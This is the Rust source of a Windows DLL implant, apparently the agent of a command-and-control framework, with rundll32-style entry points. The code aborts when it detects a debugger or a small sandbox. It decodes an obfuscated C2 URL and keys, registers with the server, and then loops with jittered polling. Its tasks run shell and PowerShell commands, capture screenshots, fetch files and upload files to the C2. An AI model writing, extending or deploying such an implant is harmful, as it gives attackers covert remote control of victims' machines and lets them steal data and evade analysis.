use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;

mod api;
mod commands;
mod crypto;
mod http;
mod win32;

use crate::win32::*;

include!(concat!(env!("OUT_DIR"), "/config_gen.rs"));

static RUNNING: AtomicBool = AtomicBool::new(true);
static AGENT_SPAWNED: AtomicBool = AtomicBool::new(false);

#[no_mangle]
pub extern "system" fn DllMain(
    _hinst_dll: HINSTANCE,
    fdw_reason: DWORD,
    _lpv_reserved: LPVOID,
) -> BOOL {
    match fdw_reason {
        DLL_PROCESS_ATTACH => {
            // NO thread::spawn here — DllMain runs under loader lock,
            // spawning threads can deadlock. RunDllEntry handles it.
        }
        DLL_PROCESS_DETACH => {
            RUNNING.store(false, Ordering::SeqCst);
        }
        _ => {}
    }
    TRUE
}

#[no_mangle]
pub extern "system" fn Run() -> BOOL {
    if !AGENT_SPAWNED.swap(true, Ordering::SeqCst) {
        thread::spawn(agent_main);
    }
    TRUE
}

#[no_mangle]
pub extern "system" fn RunDllEntry(
    _hwnd: isize,
    _hinst: isize,
    _lpCmdLine: *mut u8,
    _nCmdShow: i32,
) {
    if !AGENT_SPAWNED.swap(true, Ordering::SeqCst) {
        thread::spawn(agent_main);
    }
    loop {
        thread::sleep(Duration::from_secs(3600));
    }
}

fn agent_main() {
    if check_sandbox() {
        std::process::abort();
    }

    let c2_url = deobf(C2_URL_BYTES);
    let api_key = deobf(API_KEY_BYTES);
    let aes_key_hex = deobf(AES_KEY_HEX_BYTES);
    let aes_key = crypto::decrypt_key(&aes_key_hex);
    let poll_interval = POLL_INTERVAL;
    let jitter = JITTER;
    let task_timeout = TASK_TIMEOUT_MS;

    let client = match http::HttpClient::new() {
        Some(c) => c,
        None => return,
    };

    let (agent_id, token) = match api::register(&client, &c2_url, &api_key, &aes_key) {
        Some(r) => r,
        None => {
            thread::sleep(Duration::from_secs(15));
            return;
        }
    };

    while RUNNING.load(Ordering::SeqCst) {
        if let Some(tasks) = api::poll_tasks(&client, &c2_url, &agent_id, &token, &aes_key) {
            for task in tasks {
                let result = match task.task_type.as_str() {
                    "cmd" => commands::execute_cmd(&task.command, task_timeout),
                    "raw" => commands::execute_raw(&task.command, task_timeout),
                    "powershell" => {
                        commands::execute_powershell(&task.command, task_timeout)
                    }
                    "sleep" => Some(commands::execute_sleep(
                        task.command.parse::<u64>().unwrap_or(10),
                    )),
                    "screenshot" => take_screenshot_result(),
                    "download" => {
                        let parts: Vec<&str> = task.command.splitn(2, ' ').collect();
                        if parts.len() == 2 {
                            commands::download_file(&client, parts[0], parts[1]);
                        }
                        None
                    }
                    "upload" => {
                        let parts: Vec<&str> = task.command.splitn(2, ' ').collect();
                        if parts.len() == 2 {
                            api::upload_file(
                                &client, &c2_url, &token, parts[0], parts[1], &aes_key,
                            );
                        }
                        None
                    }
                    "exit" => {
                        RUNNING.store(false, Ordering::SeqCst);
                        None
                    }
                    _ => None,
                };

                if let Some(r) = result {
                    let _ = api::report_result(
                        &client, &c2_url, &token, &task.id, &r.stdout, &r.stderr, r.exit_code,
                        &aes_key,
                    );
                }
            }
        }

        let jitter_secs = rand::Rng::gen_range(&mut rand::thread_rng(), 0..=jitter);
        thread::sleep(Duration::from_secs(poll_interval + jitter_secs));
    }
}

fn take_screenshot_result() -> Option<commands::ExecResult> {
    use base64::Engine;
    let data = commands::take_screenshot();
    match data {
        Some(d) => Some(commands::ExecResult {
            stdout: format!(
                "SCREENSHOT_DATA:{}",
                base64::engine::general_purpose::STANDARD_NO_PAD.encode(&d)
            ),
            stderr: String::new(),
            exit_code: 0,
        }),
        None => Some(commands::ExecResult {
            stdout: String::new(),
            stderr: "screenshot failed".into(),
            exit_code: 1,
        }),
    }
}

fn check_sandbox() -> bool {
    unsafe {
        if IsDebuggerPresent() != 0 {
            return true;
        }

        let mut sys_info: SYSTEM_INFO = std::mem::zeroed();
        GetNativeSystemInfo(&mut sys_info);
        if sys_info.dwNumberOfProcessors < 2 {
            return true;
        }

        let mut mem_status: MEMORYSTATUSEX = std::mem::zeroed();
        mem_status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        GlobalMemoryStatusEx(&mut mem_status);
        if mem_status.ullTotalPhys < 2_147_483_648 {
            return true;
        }
    }
    false
}


